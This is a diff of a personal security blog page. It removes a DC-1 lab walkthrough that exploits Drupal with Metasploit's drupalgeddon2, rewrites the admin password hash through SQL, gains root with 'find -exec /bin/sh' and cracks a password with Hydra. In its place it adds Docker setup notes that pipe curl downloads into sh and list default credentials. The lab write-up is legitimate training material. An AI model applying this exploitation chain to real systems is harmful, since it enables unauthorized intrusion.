@@ -4,14 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DC靶场渗透报告, 昊の米奇妙妙屋">
-    <meta name="description" content="渗透测试范围：DC-1靶场
-渗透测试主要内容:获取所有flag
-渗透测试分析工具：Msf  Hydra  Nmap  Goby
-渗透过程一、信息收集二、目录探测三、数据库访问四、用户信息修改五、提权及越权访问
-一、信息收集信息收集
+    <meta name="keywords" content="昊の米奇妙妙屋">
+    <meta name="description" content="docker环境备忘安装docker123curl -sSL https://get.daocloud.io/docker | shservice docker start
 
-nma">
+
+[官方某版]安装docker-compose *
+
+123cu">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -23,7 +22,7 @@ nma">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>DC靶场渗透报告 | 昊の米奇妙妙屋</title>
+    <title>昊の米奇妙妙屋</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -352,7 +351,7 @@ nma">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DC靶场渗透报告</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -409,40 +408,62 @@ nma">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>渗透测试范围：DC-1靶场</p>
-<p>渗透测试主要内容:获取所有flag</p>
-<p>渗透测试分析工具：Msf  Hydra  Nmap  Goby</p>
-<p>渗透过程<br>一、信息收集<br>二、目录探测<br>三、数据库访问<br>四、用户信息修改<br>五、提权及越权访问</p>
-<p>一、信息收集<br>信息收集</p>
-<p><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/a7a2f51c-8911-4dd0-8f40-2de65e440988/%E5%9B%BE%E7%89%871.png"></p>
-<p>nmap -sS -A -T4 -v -p- 192.168.101.76</p>
-<p>nmap信息收集  whatweb -v 192.168.101.76  msf查看漏洞<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/1fa805fd-dd80-4992-a599-89be25305106/%E5%9B%BE%E7%89%872.png"></p>
-<p> 看到版本是Drupal7    msf查看Drupal漏洞<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/4b051750-e97a-48f3-8854-231c239a910e/%E5%9B%BE%E7%89%873.png"><br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/c97a2c0b-2274-4b3a-8f68-d4ad0054e6b5/%E5%9B%BE%E7%89%874.png"></p>
-<p>看到版本是Drupal7<br>msf漏洞利用   exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection<br>use 1<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/34f041b7-12f2-4576-b591-34f9484d25b5/%E5%9B%BE%E7%89%875.png"><br>set rhosts 192.168.101.76  设置攻击目标  运行<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/15e4d2ff-62eb-4687-9e03-d1d4e43e7e8d/%E5%9B%BE%E7%89%876.png"><br>成功进入目标主机</p>
-<p>二、目录遍历人工探测</p>
-<p>ls查目录下发现flag1.txt<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/663aadf4-3b2a-411a-a31b-640648d61728/%E5%9B%BE%E7%89%877.png"><br>cat一下<br>flag1:Every good CMS needs a config file - and so do you.<br>提示下一个flag在CMS配置里<br>挨个文件夹查看发现在sites&#x2F;default中找到settings.php<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/32537d08-689d-4b35-9e8f-5b1b522a5e92/%E5%9B%BE%E7%89%878.png"><br>进入&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php<br>查找到flag2</p>
-<p>flag2:<br>  Brute force and dictionary attacks aren’t the<br> only ways to gain access (and you WILL need access).<br>  What can you do with these credentials?</p>
-<p>settings.php有数据库mysql账号密码<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/97f4f822-d233-4214-8050-ae2d5bb7417f/%E5%9B%BE%E7%89%879.png"><br>‘username’ &#x3D;&gt; ‘dbuser’,<br>‘password’ &#x3D;&gt; ‘R0ck3t’,<br>三、数据库访问</p>
-<p>切换至drupaldb数据库<br>show tables;查看发现users<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/60ab3817-70ed-4e21-9c02-0edbc327bec8/%E5%9B%BE%E7%89%8710.png"><br>select * from users;<br>发现admin账号<br>四、用户信息修改<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/32648507-b5e8-4b98-9ec9-4c6c7f54446c/%E5%9B%BE%E7%89%8711.png"><br>但是密码为加盐哈希<br>自己生成加盐哈希<br>php scripts&#x2F;password-hash.sh<br>通过update指令将admin密码替换为自己想要的字符  为123456<br>update users set pass&#x3D;“$S$DbMvAoubjFarHeOSmpCquZ&#x2F;CMlzACoKxob5lSfw&#x2F;YCPV4rcLy4&#x2F;Q”where name&#x3D;”admin”<br>进入web页面发现flag3<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/7d70b380-474b-4462-b843-6a16d2e84148/%E5%9B%BE%E7%89%8712.png"><br>Flag3:Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
-<p>五、提权及越权访问</p>
-<p>通过find提权成为root用户 find &#x2F; -exec “&#x2F;bin&#x2F;sh” ;<br>在&#x2F;etc&#x2F;shadows中查找到flag4用户的密码</p>
-<p>也可通过查看&#x2F;etc&#x2F;passwd中查看到flag4用户<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/0cd01111-4e0f-4016-baa5-43dc40d6545b/%E5%9B%BE%E7%89%8713.png"><br>通过hydra工具爆破密码<br>得到密码为orange<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/bc73a822-5b4a-47f0-9f1a-e6a0efdda97e/%E5%9B%BE%E7%89%8714.png"><br>在home文件夹下查找到flag4文件夹<br>进入flag4查找到flag4.txt<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/371b1452-cc8f-4e21-8711-79075400e009/%E5%9B%BE%E7%89%8715.png"><br>Can you use this same method to find or access the flag in root?</p>
-<p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
-<p>flag4提示下一个flag在root中</p>
-<p>访问&#x2F;root提示访问被拒绝<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/50406964-0370-4f3a-adaa-45ee940ccd68/%E5%9B%BE%E7%89%8716.png"><br>通过find提权进入root文件夹发现thefinalflag.txt<br><img src="https://raw.gitcode.com/2402_86565793/Azzisw/attachment/uploads/b1ae3916-2fe4-410f-b16f-8eb57f064106/%E5%9B%BE%E7%89%8717.png"><br>flag5:</p>
-<p>cat thefinalflag.txt<br>Well done!!!!<br>Hopefully you’ve enjoyed this and learned some new skills.<br>You can let me know what you thought of this little journey</p>
-<p>至此试验结束  5个flag全部拿到</p>
-<p>渗透测试总结：在本次渗透测试中，我们获取到了CMS的配置文件，然后对靶机中的passwd进行了获取，最后进入数据库进行查询、更改操作，在网站后台获取到了关键信息，最后进行提权操作，则我们在面对靶机时应有以下思路<br>1.信息收集与利用<br>2.对数据库数据的操作，对密码的处理<br>3.权限提升<br>4.靶机内文件的用户信息详情</p>
-<p>本次实验用到的一些命令</p>
-<p>shell</p>
-<p>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’ </p>
-<p>mysql -u dbuser -pR0ck3t<br>登录mysql数据库</p>
-<p>use drupaldb切换数据库</p>
-<p>update users set pass&#x3D;“$S$DbMvAoubjFarHeOSmpCquZ&#x2F;CMlzACoKxob5lSfw&#x2F;YCPV4rcLy4&#x2F;Q”where name&#x3D;”admin”;<br>更新admin密码哈希值</p>
-<p>php scripts&#x2F;password-hash.sh 123456<br>生成加盐哈希值</p>
-<p>find &#x2F; -exec “&#x2F;bin&#x2F;sh” ;<br>利用find提权</p>
-<p>用到的工具<br>Msf  nmap  hydra</p>
+                <h1 id="docker环境备忘"><a href="#docker环境备忘" class="headerlink" title="docker环境备忘"></a>docker环境备忘</h1><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br><span class="line"></span><br><span class="line">service docker start</span><br></pre></td></tr></table></figure>
 
+<ul>
+<li>[官方某版]安装docker-compose *</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` &gt; /usr/bin/docker-compose</span><br><span class="line"></span><br><span class="line">chmod +x /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>
+
+<p><em>[实测带依赖]安装docker&#x2F;docker-compose</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3.7-distutils   3.7 是对应你的版本</span><br><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python3</span><br><span class="line">curl -s https://get.docker.com/ | sh</span><br><span class="line">systemctl start docker</span><br><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure>
+
+<h2 id="安装ping"><a href="#安装ping" class="headerlink" title="安装ping"></a><em>安装ping</em></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install inetutils-ping net-tools</span><br></pre></td></tr></table></figure>
+
+<h2 id="安装hfish"><a href="#安装hfish" class="headerlink" title="安装hfish"></a><em>安装hfish</em></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name hfish \</span><br><span class="line">-v /usr/share/hfish:/usr/share/hfish \</span><br><span class="line">--network host \</span><br><span class="line">--privileged=true \</span><br><span class="line">threatbook/hfish-server:latest</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker run -d    \</span><br><span class="line"> --name watchtower \</span><br><span class="line"> --restart unless-stopped \</span><br><span class="line">  -v /var/run/docker.sock:/var/run/docker.sock  \</span><br><span class="line">  --label=com.centurylinklabs.watchtower.enable=false \</span><br><span class="line">--privileged=true \</span><br><span class="line">  containrrr/watchtower  \</span><br><span class="line">  --cleanup  \</span><br><span class="line">  hfish \</span><br><span class="line">  --interval 3600</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="awvs-nessus镜像"><a href="#awvs-nessus镜像" class="headerlink" title="awvs&#x2F;nessus镜像"></a><em>awvs&#x2F;nessus镜像</em></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 拉取镜像</span><br><span class="line">  docker pull leishianquan/awvs-nessus:v1</span><br><span class="line">  # 启动</span><br><span class="line">  docker run -it -d -p 13443:3443 -p 8834:8834 leishianquan/awvs-nessus:v1</span><br><span class="line">  # 查看容器</span><br><span class="line">  docker ps –a</span><br><span class="line">  # 启动容器</span><br><span class="line">  docker start container-id</span><br><span class="line">  # 进入容器</span><br><span class="line">  docker exec –it container-id /bin/bash</span><br><span class="line">  </span><br><span class="line">  # 进入容器后，启动nessus</span><br><span class="line">  /etc/init.d/nessusd start</span><br><span class="line">  </span><br><span class="line">  # 访问扫描器地址和账号密码</span><br><span class="line">  Nessus:</span><br><span class="line">  https://127.0.0.1:8834/#/</span><br><span class="line">  account:leishi/leishianquan</span><br><span class="line"></span><br><span class="line">  Awvs13:</span><br><span class="line">  https://127.0.0.1:13443/</span><br><span class="line">  account:admin@admin.com/Admin123</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h2 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h2></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull postgres:latest</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume create postgres-volume</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name=postgres -p 5432:5432 -v postgres_docker_db:/var/lib/postgresql/data -e POSTGRES_PASSWORD=123456 postgres</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h2 id="安装minio"><a href="#安装minio" class="headerlink" title="安装minio"></a>安装minio</h2></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -dit --name minio -p 9000:9000 -p 9001:9001 -v ./minio/data/:/data -e MINIO_ROOT_USER=&quot;admin&quot; -e MINIO_ROOT_PASSWORD=&quot;Pass@123123&quot; bitnami/minio:2023.3.13</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h2 id="安装dm8数据库"><a href="#安装dm8数据库" class="headerlink" title="安装dm8数据库"></a>安装dm8数据库</h2></li>
+</ul>
+<p>新版本 Docker 镜像中数据库默认用户名&#x2F;密码为 SYSDBA&#x2F;SYSDBA001</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 5236:5236 --restart=always --name dm8_01 --privileged=true -e PAGE_SIZE=16 -e LD_LIBRARY_PATH=/opt/dmdbms/bin -e INSTANCE_NAME=dm8_01 -v /data/dm8_01:/opt/dmdbms/data dm8_single:v8.1.2.128_ent_x86_64_ctm_pack4</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h2 id="部署MySQL"><a href="#部署MySQL" class="headerlink" title="部署MySQL"></a>部署MySQL</h2></li>
+</ul>
+<p>部署5.7</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run --name mysql-server -e MYSQL_ROOT_PASSWORD=123456 -p 3306:3306  mysql:5.7</span><br></pre></td></tr></table></figure>
+
+<p>导入sql文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp /tmp/apikiller.sql bteye-mysql:/tmp/apikiller.sql</span><br><span class="line">sudo docker exec -it mysql-server mysql -uroot -p123456</span><br><span class="line">source /tmp/apikiller.sql</span><br></pre></td></tr></table></figure>
+
+<h2 id="部署nsqd"><a href="#部署nsqd" class="headerlink" title="部署nsqd"></a><em>部署nsqd</em></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name nsqadmin -p 4151:4151 nsqio/nsq /nsqadmin --lookupd-http-address=121.37.175.222:4151</span><br><span class="line">docker run --name nsqd -p 4150:4150  -d nsqio/nsq /nsqd --broadcast-address=121.37.175.222 --lookupd-tcp-address=121.37.175.222:4150</span><br></pre></td></tr></table></figure>
+
+<h2 id="部署phpmyadmin"><a href="#部署phpmyadmin" class="headerlink" title="部署phpmyadmin"></a><em>部署phpmyadmin</em></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name pma -dit -e PMA_HOST=192.168.20.46 -e PMA_PORT=49153 -e PMA_USER和PMA_PASSWORD=123456 -P phpmyadmin</span><br></pre></td></tr></table></figure>
+
+<h2 id="部署nginx-反代知识星球"><a href="#部署nginx-反代知识星球" class="headerlink" title="部署nginx 反代知识星球"></a><em>部署nginx 反代知识星球</em></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">docker run  --name zsxq -d -e YOUR_ACCESS_TOKEN=&quot;xxxxx&quot; -e YOUR_IP_OR_DOMAIN=&quot;xx.xx.xx.xx:9090&quot; -p 9090:80 zgao/zsxq</span><br></pre></td></tr></table></figure>
                 
             </div>
             <hr/>
@@ -468,7 +489,7 @@ nma">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2025/02/11/DC-1/">http://example.com/2025/02/11/DC-1/</a>
+                    <a href="http://example.com/2025/02/11/docker-%E7%8E%AF%E5%A2%83%E5%A4%87%E5%BF%98/">http://example.com/2025/02/11/docker-%E7%8E%AF%E5%A2%83%E5%A4%87%E5%BF%98/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -549,54 +570,18 @@ nma">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2025/02/11/SQL%E6%B3%A8%E5%85%A5/">
+                <a href="/2025/02/11/docker-%E7%8E%AF%E5%A2%83%E5%A4%87%E5%BF%98/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="SQL注入">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">SQL注入</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-02-11
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Azzisw
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2025/02/06/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -607,7 +592,45 @@ nma">
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-02-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-02-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Azzisw
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/02/11/XSS/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="XSS">
+                        
+                        <span class="card-title">XSS</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-02-11
                             </span>
                         <span class="publish-author">
                             
